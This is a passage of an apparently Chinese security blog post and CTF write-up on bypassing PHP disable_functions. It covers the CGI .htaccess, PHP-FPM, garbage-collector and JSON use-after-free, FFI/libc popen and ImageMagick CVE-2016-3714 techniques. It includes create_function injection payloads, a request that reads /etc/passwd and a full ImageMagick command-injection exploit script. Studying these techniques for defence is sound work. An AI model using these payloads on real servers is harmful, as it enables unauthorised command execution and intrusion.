+<h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><p>然后我们把所有相关文件上传到web目录下</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-34.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_14-34.png">
+<h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>看一下效果</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_14-37.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_14-37.png">
+<h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><h2 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="Apache Mod CGI"></a>Apache Mod CGI</h2><p>CGI是什么？简单来说就是放在服务器上的可执行程序,比如使用linux shell脚本编写的cgi程序便可以执行系统命令，任何具有MIME类型application&#x2F;x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端，可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中，绕过方式：就是利用htaccess覆盖apache配置，增加cgi程序达成执行系统命令，利用条件是当我们发现目标主机Apache开启了CGI，Web目录下有写入的权限：</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-26.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-26.png">
+<h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-27.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-27.png">
+<h6 id="-13"><a href="#-13" class="headerlink" title=""></a></h6><p>在本地准备好.htaccess文件和要执行命令的cgi文件</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-30.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-30.png">
+<h6 id="-14"><a href="#-14" class="headerlink" title=""></a></h6><p>通过蚁剑上传到web目录</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-32.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-32.png">
+<h6 id="-15"><a href="#-15" class="headerlink" title=""></a></h6><p>这个时候我们的CGI还不能执行，因为还没有权限，我们使用php的chmod()函数给其添加可执行权限</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-33.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-33.png">
+<h6 id="-16"><a href="#-16" class="headerlink" title=""></a></h6><p>赋予权限以后，当我们再访问CGI文件便可成功执行命令</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-34.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-34.png">
+<h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>也可以尝试直接使用蚁剑的插件</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-35.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-35.png">
+<h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>什么是PHP-FPM？FPM就是Fastcgi的协议解析器，Web服务器使用CGI协议封装好用户的请求发送给FPM，FPM按照CGI的协议将TCP流解析成真正的数据，由于FPM默认监听的是9000端口，我们就可以绕过Web服务器，直接构造Fastcgi协议，和fpm进行通信，于是就有了利用Webshell直接与FPM通信从而绕过disable_functions的姿势，利用条件：当我们拿到一个shell之后，查看phpinfo发现设置了disable_functions，并且我们发现目标主机配置了FPM&#x2F;Fastcgi，这个时候就可以使用PHP-FPM绕过disable_functions来执行命令</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-43.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-43.png">
+<h6 id="-19"><a href="#-19" class="headerlink" title=""></a></h6><p>蚁剑中有通过PHP-FPM模式绕过disable_functions的插件（注意：该模式下需要选择PHP-FPM的接口地址，需要自行找配置文件查FPM接口地址，默认的是 unix:&#x2F;&#x2F;&#x2F;本地Socket这种的，如果配置成TCP的默认是127.0.0.1:9000）</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-45.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-45.png">
+<h6 id="-20"><a href="#-20" class="headerlink" title=""></a></h6><p>成功配置后，会在同目录下上传一个.antproxy.php文件，我们只需重新连接获取新的shell即可，新的shell是可以成功执行所有命令的</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-47.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-47.png">
+<h6 id="-21"><a href="#-21" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_15-48.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_15-48.png">
+<h6 id="-22"><a href="#-22" class="headerlink" title=""></a></h6><h2 id="GC-UAF"><a href="#GC-UAF" class="headerlink" title="GC UAF"></a>GC UAF</h2><p>原理就是利用PHP垃圾收集器中很多年前存在的一个bug，通过PHP垃圾收集器中堆溢出来绕过disable_functions并执行系统命令，php版本利用条件：7.0-7.3，接下来，还是通过 一道CTF题目【GKCTF2020】CheckIN 来演示如何绕过，此时我们已经拿到了shell,然后需要下载我们要利用到的脚本：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass">https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass</a><br>下载后，在pwn函数中放置你想要执行的系统命令</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-04.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_16-04.png">
+<h6 id="-23"><a href="#-23" class="headerlink" title=""></a></h6><p>但是这样有一个弊端，每次执行什么命令，都需要去改PWN函数里面的内容，所以我们可以直接该为POST传参</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-06.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_16-06.png">
+<h6 id="-24"><a href="#-24" class="headerlink" title=""></a></h6><p>然后将修改完的脚本上传至目标主机有权限的目录当中，然后将脚本包含进来并使用POST方法提供你想要执行的命令即可</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_23-18.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_23-18.png">
+<h6 id="-25"><a href="#-25" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-23.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_16-23.png">
+<h6 id="-26"><a href="#-26" class="headerlink" title=""></a></h6><h2 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h2><p>原理就是利用json序列化程序中的堆溢出触发，以绕过disable_functions和执行系统命令，利用方法和其他的UAF绕过disable_functions大同小异，首先我们下载利用脚本：<a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">https://github.com/mm0r1/exploits/tree/master/php-json-bypass</a> 下载下来之后，还是像刚才那样对脚本稍作修改，改成传参形式</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-44.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_16-44.png">
+<h6 id="-27"><a href="#-27" class="headerlink" title=""></a></h6><p>修改完成之后，上传至有权限的目录（&#x2F;var&#x2F;tmp&#x2F;）后包含执行就可以了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?xxx=include(<span class="hljs-string">&quot;/var/tmp/exploit.php&quot;</span>);<br>POST: <span class="hljs-built_in">whoami</span>=<span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_16-47.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_16-47.png">
+<h6 id="-28"><a href="#-28" class="headerlink" title=""></a></h6><h2 id="FFI扩展"><a href="#FFI扩展" class="headerlink" title="FFI扩展"></a>FFI扩展</h2><p>在php的7.4版本中有一个新特性即FFI即外部函数接口，总结来说就是能够让你在php中调用c的技术，这样一来，我们可以先声明C中的命令执行函数或其他能实现我们需求的函数，然后再通过FFI变量调用该C函数即可Bypass，下面通过2020年极客大挑战的一道题目来演示如何利用PHP 7.4 FFI成功突破disable_functions的限制。进入题目后，首先发现源代码中有一段提示</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-25.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_17-25.png">
+<h6 id="-29"><a href="#-29" class="headerlink" title=""></a></h6><p>说明可以动态的执行php代码，此刻联想到了create_function代码注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-built_in">whoami</span>]);/*<br></code></pre></td></tr></table></figure>
+<p>成功连接蚁剑，but!!但是无法访问其他目录，刚开始我脑子抽了，一直以为是我的环境或者电脑出了什么问题，以至于在这里耽误了很长时间…😰</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-29.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_17-29.png">
+<h6 id="-30"><a href="#-30" class="headerlink" title=""></a></h6><p>通过create_function代码注入执行phpinfo()，看到了disable_functions和FFI的配置信息，够狠..函数基本给我禁了了并且FFI也是开启的</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-34.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_17-34.png">
+<h6 id="-31"><a href="#-31" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-35.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_17-35.png">
+<h6 id="-32"><a href="#-32" class="headerlink" title=""></a></h6><p>首先尝试调用C库的system函数，因为考虑到c库中的system执行命令没有回显，所以可以将结果写入到一个有权限的目录，然后再用echo将结果读出来</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?f</span>ighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-variable">$ffi</span> = <span class="hljs-variable constant_">FFI</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:cdef</span>(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-string">&quot;ls / &gt; /tmp/res.txt&quot;</span>);echo file_get_contents(<span class="hljs-string">&quot;/tmp/res.txt&quot;</span>);<span class="hljs-regexp">/*</span><br></code></pre></td></tr></table></figure>
+<p>but!!失败了..没有返回任何结果，C库的system函数调用shell命令，只能获取到shell命令的返回值，而不能获取shell命令的输出结果，如果想获取输出结果我们可以用popen函数来实现，所以，我们还可以利用C库的popen()函数来执行命令，但要读取到结果还需要C库的fgetc等函数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/?fighter=create_function&amp;fights=&amp;invincibly=;&#125;<span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;void *popen(char*,char*);void pclose(void*);int fgetc(void*);&quot;</span>,<span class="hljs-string">&quot;libc.so.6&quot;</span>);<span class="hljs-variable">$o</span> = <span class="hljs-variable">$ffi</span>-&gt;popen(<span class="hljs-string">&quot;ls /&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$c</span> = <span class="hljs-variable">$ffi</span>-&gt;fgetc(<span class="hljs-variable">$o</span>)) != -1)&#123;<span class="hljs-variable">$d</span> .= str_pad(strval(dechex(<span class="hljs-variable">$c</span>)),2,<span class="hljs-string">&quot;0&quot;</span>,0);&#125;<span class="hljs-variable">$ffi</span>-&gt;pclose(<span class="hljs-variable">$o</span>);<span class="hljs-built_in">echo</span> hex2bin(<span class="hljs-variable">$d</span>);/*<br></code></pre></td></tr></table></figure>
+<p>执行结束后，查看源码可以发现成功执行命令（ls &#x2F;），并成功读取到结果</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_17-37.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_17-37.png">
+<h6 id="-33"><a href="#-33" class="headerlink" title=""></a></h6><h2 id="ImageMagick"><a href="#ImageMagick" class="headerlink" title="ImageMagick"></a>ImageMagick</h2><p>imagemagick是一个用于处理图片的程序，它可以读取、转换、写入多种格式的图片，其实ImageMagick绕过disable_functions说白了就是使用ImageMagick的一个历史漏洞(CVE-2016-3714)，只要将精心构造的图片上传至使用漏洞版本的ImageMagick，ImageMagick会自动对其格式进行转换，转换过程中就会执行攻击者插入在图片中的命令，所以如果在phpinfo中看到有这个ImageMagick，都可以进行尝试一下</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-09.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_20-09.png">
+
+<p>为了方便演示，我直接使用网上已有的docker镜像来搭建环境</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker pull medicean/vulapps:i_imagemagick_1<br>docker <span class="hljs-built_in">run</span> -d -p 8000:80 <span class="hljs-attribute">--name</span>=i_imagemagick_1 medicean/vulapps:i_imagemagick_1<br></code></pre></td></tr></table></figure>
+<p>进入容器查看poc.php和poc.png，这其实是已经写好的poc,执行命令就是ls -la，当然想要执行命令我们可以自己构造，poc也可自行构建</p>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-17.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_20-17.png">
+<h6 id="-34"><a href="#-34" class="headerlink" title=""></a></h6><img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-14.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_20-14.png">
+<h6 id="-35"><a href="#-35" class="headerlink" title=""></a></h6><p>开始验证poc,在容器外执行，可以发现成功执行了ls -la命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker <span class="hljs-built_in">exec</span> i_imagemagick_1 convert /poc.png 1.png<br></code></pre></td></tr></table></figure>
+<img src="/2024/05/05/disable-functions%E7%BB%95%E8%BF%87/2024-05-01_20-17_1.png" srcset="/img/loading.gif" lazyload class="" title="2024-05-01_20-17_1.png">
+<h6 id="-36"><a href="#-36" class="headerlink" title=""></a></h6><p>附上利用脚本，将其上传到目标主机有权限的目录，然后包含该脚本并传参执行命令即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Disable Functions: &quot;</span> . <span class="hljs-title function_ invoke__">ini_get</span>(<span class="hljs-string">&#x27;disable_functions&#x27;</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$command</span> = PHP_SAPI == <span class="hljs-string">&#x27;cli&#x27;</span> ? <span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>] : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$command</span> == <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>   <span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;id&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$exploit</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">push graphic-context</span><br><span class="hljs-string">viewbox 0 0 640 480</span><br><span class="hljs-string">fill &#x27;url(https://example.com/image.jpg&quot;|<span class="hljs-subst">$command</span>&quot;)&#x27;</span><br><span class="hljs-string">pop graphic-context</span><br><span class="hljs-string">EOF</span>;<br><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>, <span class="hljs-variable">$exploit</span>);<br><span class="hljs-variable">$thumb</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;KKKK.mvg&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;KKKK.png&#x27;</span>);<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">clear</span>();<br><span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">destroy</span>();<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.mvg&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;KKKK.png&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>【参考文章】<br><a target="_blank" rel="noopener" href="https://www.laruence.com/2020/03/11/5475.html">https://www.laruence.com/2020/03/11/5475.html</a><br><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.ffi.php">https://www.php.net/manual/zh/class.ffi.php</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html">https://www.leavesongs.com/PENETRATION/CVE-2016-3714-ImageMagick.html</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/fs-IKJuDptJeZMRDCtbdkw">https://mp.weixin.qq.com/s/fs-IKJuDptJeZMRDCtbdkw</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/192052.html">https://www.freebuf.com/articles/web/192052.html</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/_L379eq0kufu3CCHN1DdkA">https://mp.weixin.qq.com/s/_L379eq0kufu3CCHN1DdkA</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%80%BB%E7%BB%93/" class="print-no-link">#总结</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>disable_functions绕过</div>
+      <div>http://example.com/2024/05/05/disable-functions绕过/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>liuty</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年5月5日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/05/08/Drozer-Android%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/" title="Drozer-Android安全测试">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Drozer-Android安全测试</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/04/10/k8s%E5%AE%89%E5%85%A8/" title="k8s安全">
+                        <span class="hidden-mobile">k8s安全</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://l1uty.github.io/" target="_blank" rel="nofollow noopener"><span>liuty</span></a> <i class="iconfont icon-love"></i> <a href="https://www.mps.gov.cn/" target="_blank" rel="nofollow noopener"><span>???</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <script type="text/javascript" src="\js\FunnyTitle.js"></script>
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/diy/love.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+
+  <link rel="stylesheet" href="/dist/APlayer.min.css">
+  <div id="aplayer"></div>
+  <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+  <script type="text/javascript" src="/dist/music.js"></script>
+
+  <script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+  </script>
+
+  <script type="text/javascript" src="\js\snow.js"></script>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
